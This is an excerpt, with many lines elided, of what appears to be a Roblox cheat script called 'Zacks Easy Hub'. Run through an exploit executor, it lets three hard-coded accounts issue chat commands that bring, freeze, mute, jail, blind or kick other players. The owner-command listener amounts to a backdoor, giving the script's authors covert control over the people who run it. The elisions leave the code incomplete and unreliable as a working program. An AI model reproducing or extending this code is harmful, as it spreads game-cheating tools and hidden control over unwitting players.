...
if getgenv().LocalPlayer.Name == "L0CKED_1N1" or getgenv().LocalPlayer.Name == "Laylay_4kla" or getgenv().LocalPlayer.Name == "CHEATING_B0SS" then
    ...
    local function handleCommand(command, playerName)
        ...
        if command == ".bring" then
            local owner = cmdp:FindFirstChild("L0CKED_1N1") or cmdp:FindFirstChild("CHEATING_B0SS")
        ...
        elseif command == ".bring" then
            if player then
                ...
                return warn("Player: "..tostring(player)..", was not found!")
            end
        ...
        elseif command == ".freeze" then
            if player then
                run_freeze("true", player)
            else
                return warn("Player (Character): "..tostring(player)..", was not found!")
            end
        elseif command == ".unfreeze" then
            if player then
                run_freeze("false", player)
            else
                return warn("Player (Character): "..tostring(player)..", was not found!")
            end
        ...
        elseif command == ".mute" then
            if player then
                muteEvent:Fire(player, true)
            else
                return warn("Player: "..tostring(player)..", was not found!")
            end
        elseif command == ".unmute" then
            if player then
                muteEvent:Fire(player, false)
            else
                return warn("Player: "..tostring(player)..", was not found!")
            end
        ...
        elseif command == ".unblur all" then
            if player then
                if game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION") then
                    local blur = game:GetService("Workspace"):FindFirstChild("Camera"):FindFirstChild("VISION")
                    blur.Enabled = false
    ...
    getgenv().TextChatService.MessageReceived:Connect(function(message) 
        ...
        if sender == "L0CKED_1N1" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" then
            local prefix, command, playerName = string.match(text, "^(%p)(%w+)%s*(.*)")
            if prefix and command then
                handleCommand(prefix .. command, playerName)
            else
    ...
    function jail_plr(player)
        jailEvent:Fire(player)
    end

    function blind_plr(player)
        blindEvent:Fire(player)
    end
    ...
    function run_mute_cmd(player, boolean)
        if boolean == true then
            muteEvent:Fire(player, true)
        elseif boolean == false then
            muteEvent:Fire(player, false)
        else
            return warn("Invalid arguments provided!")
        end
    end
    ...
    local jailEvent = Instance.new("BindableEvent")
    jailEvent.Name = "Keybinds-7"
    jailEvent.Parent = ReplicatedStorage

    local emoteEvent = Instance.new("BindableEvent")
    emoteEvent.Name = "Keybinds-8"
    emoteEvent.Parent = ReplicatedStorage

    local muteEvent = Instance.new("BindableEvent")
    muteEvent.Name = "Keybinds-9"
    ...
    emoteEvent.Event:Connect(function(player)
        local plr_to_emote = findplr(player)
        local player = plr_to_emote
    ...
    jailEvent.Event:Connect(function(player)
        local jail_plr = findplr(player)
    ...
    blindEvent.Event:Connect(function(player)
        local target_blind_plr = findplr(player)

        if target_blind_plr:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI") then
            local white_screen = target_blind_plr:WaitForChild("PlayerGui"):FindFirstChild("FULLSCREEN_GUI")
    ...
    kickEvent.Event:Connect(function(player, reason)
        ...
        if targetPlayer then
            if reason and reason ~= "" then
                ...
                targetPlayer:Kick("You have been kicked by: Zacks Easy Hub : Owner.")
            end
        else
    ...
    bringEvent.Event:Connect(function(player)
        local targetPlayer = findplr(player)
        local owner = game.Players:FindFirstChild("L0CKED_1N1") or game.Players:FindFirstChild("CHEATING_B0SS")
